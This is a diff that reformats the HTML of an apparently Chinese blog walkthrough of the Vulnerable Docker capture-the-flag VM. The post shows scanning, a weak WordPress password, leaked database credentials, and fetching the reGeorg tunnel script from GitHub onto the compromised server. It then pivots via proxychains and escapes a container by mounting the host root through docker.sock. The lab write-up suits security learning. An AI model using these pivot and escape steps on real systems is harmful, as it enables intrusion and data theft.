@@ -69,27 +69,25 @@
 
 <p>https://www.notsosecure.com/vulnerable-docker-vm/ 可以下载一个虚拟机镜像，导入后开机会提示虚拟机的IP。先使用 nmap 扫描一下</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>Nmap scan report for 192.168.30.171
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 192.168.30.171
 Host is up (0.00057s latency).
 Not shown: 998 closed ports
 PORT     STATE SERVICE
 22/tcp   open  ssh
 8000/tcp open  http-alt
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>开启了 ssh，但是没有密码无法登陆，8000 端口是一个 WordPress，有一些文章和 robots.txt ，大致翻了下，没有什么有用的信息。</p>
 
 <p>用 wpscan 扫了一下，发现有个注入，就是我上一篇文章提到的，并没什么用，没有安装插件，但是有一个叫 bob 的用户。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>Identified the following 1 user/s:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Identified the following 1 user/s:
 +----+-------+-----------------+
 | Id | Login | Name            |
 +----+-------+-----------------+
 | 1  | bob   | bob – NotSoEasy |
 +----+-------+-----------------+
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后看了眼 hint，用户的密码是 <code class="highlighter-rouge">Welcome1</code>（其实应该用字典跑的），就这样进入了后台，在草稿箱中发现了第一个 flag。</p>
 
@@ -105,12 +103,11 @@ PORT     STATE SERVICE
   <li>数据库</li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>define('DB_NAME', 'wordpress');
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>define('DB_NAME', 'wordpress');
 define('DB_USER', 'wordpress');
 define('DB_PASSWORD', 'WordPressISBest');
 define('DB_HOST', 'db:3306');
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <ul>
   <li>系统是 <code class="highlighter-rouge">Linux 8f4bca8ef241 3.13.0-128-generic #177-Ubuntu SMP Tue Aug 8 11:40:23 UTC 2017 x86_64 GNU/Linux</code>，用户是 <code class="highlighter-rouge">www-data</code>，这么新的系统直接就可以放弃提权了，否则 Dirty COW 之类的洞还是超级好用的，可以参考 <a href="https://ricterz.me/posts/Tunnel%20Manager%20-%20From%20RCE%20to%20Docker%20Escape">Tunnel Manager - From RCE to Docker Escape</a></li>
@@ -122,7 +119,7 @@ define('DB_HOST', 'db:3306');
   <li><code class="highlighter-rouge">ip addr</code></li>
 </ul>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default 
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
@@ -130,8 +127,7 @@ define('DB_HOST', 'db:3306');
     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
     inet 172.18.0.2/16 scope global eth0
        valid_lft forever preferred_lft forever
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="https://storage.virusdefender.net/blog/images/775/4.jpg" alt="" /></p>
 
@@ -141,33 +137,30 @@ define('DB_HOST', 'db:3306');
 
 <p>我使用的是 <a href="https://github.com/sensepost/reGeorg">reGeorg</a></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>curl -o tunnel.php https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -o tunnel.php https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.nosocket.php
+</code></pre></div></div>
 
 <p>浏览器访问了一下，显示 <code class="highlighter-rouge">Georg says, 'All seems fine'</code>。</p>
 
 <p>本地电脑上运行 <code class="highlighter-rouge">python reGeorgSocksProxy.py -u http://192.168.30.171:8000/tunnel.php</code></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>[INFO   ]  Log Level set to [INFO]
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[INFO   ]  Log Level set to [INFO]
 [INFO   ]  Starting socks server [127.0.0.1:8888], tunnel at [http://192.168.30.171:8000/tunnel.php]
 [INFO   ]  Checking if Georg is ready
 [INFO   ]  Georg says, 'All seems fine'
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>因为 reGeorg 提供的是 socks5 代理，所以需要本地使用 proxychains，具体配置不多说了。</p>
 
 <p><code class="highlighter-rouge">proxychains mysql -u wordpress -pWordPressISBest -h 172.18.0.4</code> 连接数据库，但是并没有找到什么 flag，然后继续扫内网，还是 nmap 那一堆命令加上 proxychains 前缀就好。然后发现一个 IP 有个奇怪的端口</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>Nmap scan report for 172.18.0.3
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 172.18.0.3
 Host is up (0.0062s latency).
 Not shown: 998 closed ports
 PORT     STATE SERVICE
 22/tcp   open  ssh
 8022/tcp open  oa-system
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>curl 看了下，貌似是一个网页，然后在设置了浏览器的 socks5 代理，就看到了，原来是一个网页版 ssh，而且这里面终于有了 <code class="highlighter-rouge">docker.sock</code>。</p>
 
@@ -181,9 +174,8 @@ PORT     STATE SERVICE
 
 <p>然后使用 volume 挂载主机上的所有文件到一个目录</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>docker run -it --rm -v /:/vol wordpress /bin/bash
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it --rm -v /:/vol wordpress /bin/bash
+</code></pre></div></div>
 
 <p>这样就可以看到 flag3了</p>
 
